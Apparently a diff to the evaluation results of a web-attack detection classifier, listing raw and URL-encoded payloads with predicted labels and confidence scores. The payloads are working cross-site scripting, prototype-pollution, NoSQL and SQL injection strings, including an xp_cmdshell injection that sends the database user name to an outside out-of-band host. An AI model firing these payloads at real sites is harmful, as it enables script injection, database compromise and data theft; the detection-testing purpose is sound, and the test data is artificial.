@@ -3834,6 +3834,492 @@
     "correct": true
   },
   {
+    "category": "Attack_PDF_107",
+    "payload": "/\"onClick=\"(prompt)(1)",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9925,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_107",
+    "payload": "/%22onClick%3D%22%28prompt%29%281%29",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9801,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_107",
+    "payload": "?dffb3d38f8=javascript:setInterval%28%27prom%27+%27pt%28document.domain%29%27%29",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9949,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_107",
+    "payload": "%3Fdffb3d38f8%3Djavascript%3AsetInterval%2528%2527prom%2527%2B%2527pt%2528document.domain%2529%2527%2529",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.991,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_108",
+    "payload": "dc1e09adea=%3Cimg%20src=x%20onerror=alert%28document.domain%29%3E%2Fall",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9996,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_108",
+    "payload": "dc1e09adea%3D%253Cimg%2520src%3Dx%2520onerror%3Dalert%2528document.domain%2529%253E%252Fall",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9994,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_109",
+    "payload": "2802f5f8e9=%22%29%29%3Bif%28%21self.x%29self.x=%21alert%28document.domain%29%7Dcatch%28e%29%7B%7D%2F%2F",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9944,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_109",
+    "payload": "2802f5f8e9%3D%2522%2529%2529%253Bif%2528%2521self.x%2529self.x%3D%2521alert%2528document.domain%2529%257Dcatch%2528e%2529%257B%257D%252F%252F",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9871,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_110",
+    "payload": "db.injection.insert%28%7Bsuccess:1%7D%29%3B",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9815,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_110",
+    "payload": "db.injection.insert%2528%257Bsuccess%3A1%257D%2529%253B",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9799,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_111",
+    "payload": "?e804afb6a1=%3Cj%20id=x%20style=%22-webkit-user-modify:read-write%22%20onfocus=%7Bwindow.onerror=eval%7Dthrow%2F0%2F+name%3EH%3C%2Fj%3E%23x",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9893,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_111",
+    "payload": "%3Fe804afb6a1%3D%253Cj%2520id%3Dx%2520style%3D%2522-webkit-user-modify%3Aread-write%2522%2520onfocus%3D%257Bwindow.onerror%3Deval%257Dthrow%252F0%252F%2Bname%253EH%253C%252Fj%253E%2523x",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9767,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_112",
+    "payload": "?8dfc44c3c7=%28xss%22%3E%3C%21--%3E%3Csvg%2Fonload=alert%28document.domain%29%3E%29",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9998,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_112",
+    "payload": "%3F8dfc44c3c7%3D%2528xss%2522%253E%253C%2521--%253E%253Csvg%252Fonload%3Dalert%2528document.domain%2529%253E%2529",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9996,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_113",
+    "payload": "?daf76f95d5=Tarun~%3C%22%3E%3Cdetails%2Fopen%2Fontoggle=%22jAvAsCrIpT&colon%3Balert&lpar%3B%2Fxss-by-tarun%2F&rpar%3B%22%3EXXXXX%3C%2Fa%3E",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9793,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_113",
+    "payload": "%3Fdaf76f95d5%3DTarun~%253C%2522%253E%253Cdetails%252Fopen%252Fontoggle%3D%2522jAvAsCrIpT%26colon%253Balert%26lpar%253B%252Fxss-by-tarun%252F%26rpar%253B%2522%253EXXXXX%253C%252Fa%253E",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9508,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_114",
+    "payload": "?75affb26b7=%3CxssBypass%2Fonpointermove=%28confirm%29%281%29%3EMoveMouseHere",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9929,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_114",
+    "payload": "%3F75affb26b7%3D%253CxssBypass%252Fonpointermove%3D%2528confirm%2529%25281%2529%253EMoveMouseHere",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9869,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_115",
+    "payload": "/__proto__[v-if]=_c.constructor('alert(1)')()",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9978,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_115",
+    "payload": "/__proto__%5Bv-if%5D%3D_c.constructor%28%27alert%281%29%27%29%28%29",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9966,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_116",
+    "payload": "?a62587115d=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9983,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_116",
+    "payload": "%3Fa62587115d%3D%253CIMG%2520SRC%3Dj%26%2523X41vascript%3Aalert%2528%2527test%2527%2529%253E",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9951,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_117",
+    "payload": "?d52bbdf0d1=%3Cbody%20onload=alert%28%27test1%27%29%3E",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9965,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_117",
+    "payload": "%3Fd52bbdf0d1%3D%253Cbody%2520onload%3Dalert%2528%2527test1%2527%2529%253E",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9924,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_118",
+    "payload": "?d7f86bf74f=123%29%20AND%2012=12%20%20AND%20JSON_DEPTH%28%27%7B%7D%27%29%20%21=%202521",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9698,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_118",
+    "payload": "%3Fd7f86bf74f%3D123%2529%2520AND%252012%3D12%2520%2520AND%2520JSON_DEPTH%2528%2527%257B%257D%2527%2529%2520%2521%3D%25202521",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9318,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_119",
+    "payload": "?4cbb3ffb50=3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.982,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_119",
+    "payload": "%3F4cbb3ffb50%3D3%253B%252F%252A%2520a%2520%252A%252F%2520DECLARE%2520%40c%2520varchar%2528255%2529%253B%252F%252A%2520b%2520%252A%252FSELECT%2520%40c%3D%2527ping%2520%2527%2Bmaster.sys.fn_varbintohexstr%2528convert%2528varbinary%252CSYSTEM_USER%2529%2529%2B%2527.000.burpcol%2527%2B%2527laborator.net%2527%253B%252F%252Axx%252A%252F%2520EXEC%2520Master.dbo.xp_cmdshell%2520%40c%253B%252F%252Axxx%252A%252F%2520EXEC%2520sp_SYS_ProtoOp%2520%40id%3D3",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9498,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_120",
+    "payload": "?f24f266870=%3Cj%20id=x%20style=%22-webkit-user-modify:read-write%22%20onfocus=%7Bwindow.onerror=eval%7Dthrow%2F0%2F+name%3EH%3C%2Fj%3E%23x",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9881,
+    "correct": true
+  },
+  {
+    "category": "Attack_PDF_120",
+    "payload": "%3Ff24f266870%3D%253Cj%2520id%3Dx%2520style%3D%2522-webkit-user-modify%3Aread-write%2522%2520onfocus%3D%257Bwindow.onerror%3Deval%257Dthrow%252F0%252F%2Bname%253EH%253C%252Fj%253E%2523x",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9738,
+    "correct": true
+  },
+  {
+    "category": "Attack_user_121",
+    "payload": "?072654838c=%2522onauxclick=alert%60xss%60+a",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9939,
+    "correct": true
+  },
+  {
+    "category": "Attack_user_121",
+    "payload": "%3F072654838c%3D%252522onauxclick%3Dalert%2560xss%2560%2Ba",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9854,
+    "correct": true
+  },
+  {
+    "category": "Attack_user_122",
+    "payload": "?a8aafb9364=%3Cimg%20src%20onerror=confirm%281%29%3E",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9967,
+    "correct": true
+  },
+  {
+    "category": "Attack_user_122",
+    "payload": "%3Fa8aafb9364%3D%253Cimg%2520src%2520onerror%3Dconfirm%25281%2529%253E",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9939,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_123",
+    "payload": "?155ec55483=%253Cx%2FOnpointerrawupdate=confirm%2526lpar%3B%29%253Exxxxx",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9894,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_123",
+    "payload": "%3F155ec55483%3D%25253Cx%252FOnpointerrawupdate%3Dconfirm%252526lpar%253B%2529%25253Exxxxx",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9467,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_124",
+    "payload": "?selectPromotionId=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&sku=211003696",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9999,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_124",
+    "payload": "%3FselectPromotionId%3D%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E%26sku%3D211003696",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9999,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_125",
+    "payload": "?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 1.0,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_125",
+    "payload": "%3FselectPromotionId%3D986205%26sku%3D%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9999,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_126",
+    "payload": "/&lt;svg/onload&equals;alert(1)&gt;",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9956,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_126",
+    "payload": "/%26lt%3Bsvg/onload%26equals%3Balert%281%29%26gt%3B",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.994,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_127",
+    "payload": "?de3c392736=&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9975,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_127",
+    "payload": "%3Fde3c392736%3D%26lt%253Bsvg%252Fonload%26equals%253Balert%25281%2529%26gt%253B",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9942,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_128",
+    "payload": "?39844967af=javascript:setInterval%28%27con%27+%27firm%28document.domain%29%27%29",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9953,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_128",
+    "payload": "%3F39844967af%3Djavascript%3AsetInterval%2528%2527con%2527%2B%2527firm%2528document.domain%2529%2527%2529",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9919,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_129",
+    "payload": "/\"));if(!self.x)self.x=!alert(document.domain)}catch(e){}/",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.996,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_129",
+    "payload": "/%22%29%29%3Bif%28%21self.x%29self.x%3D%21alert%28document.domain%29%7Dcatch%28e%29%7B%7D/",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9918,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_130",
+    "payload": "?b87e1eadb1=sometext%3Csvg%20onload=alert%28document.domain%29%3E%3FmimeType=text%2Fhtml",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9981,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_130",
+    "payload": "%3Fb87e1eadb1%3Dsometext%253Csvg%2520onload%3Dalert%2528document.domain%2529%253E%253FmimeType%3Dtext%252Fhtml",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.997,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_131",
+    "payload": "?34ea04b04c=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9971,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_131",
+    "payload": "%3F34ea04b04c%3D%253CIMG%2520SRC%3Dj%26%2523X41vascript%3Aalert%2528%2527test%2527%2529%253E",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9932,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_132",
+    "payload": "?ca6100de82=-1134%27%29%20%20OR%20JSON_EXTRACT%28%27%7B%27%27aKER%27%27:%209648%7D%27%2C%20%27$.aKER%27%29%20=%209648%2A7799%20AND%20%28%27QlYa%27%20LIKE%20%27QlYa",
+    "type": "RAW",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9631,
+    "correct": true
+  },
+  {
+    "category": "Attack_usr_132",
+    "payload": "%3Fca6100de82%3D-1134%2527%2529%2520%2520OR%2520JSON_EXTRACT%2528%2527%257B%2527%2527aKER%2527%2527%3A%25209648%257D%2527%252C%2520%2527%24.aKER%2527%2529%2520%3D%25209648%252A7799%2520AND%2520%2528%2527QlYa%2527%2520LIKE%2520%2527QlYa",
+    "type": "ENCODED",
+    "expected": "ATTACK",
+    "predicted": "ATTACK",
+    "confidence": 0.9163,
+    "correct": true
+  },
+  {
     "category": "Homepage Access",
     "payload": "GET /",
     "type": "RAW",
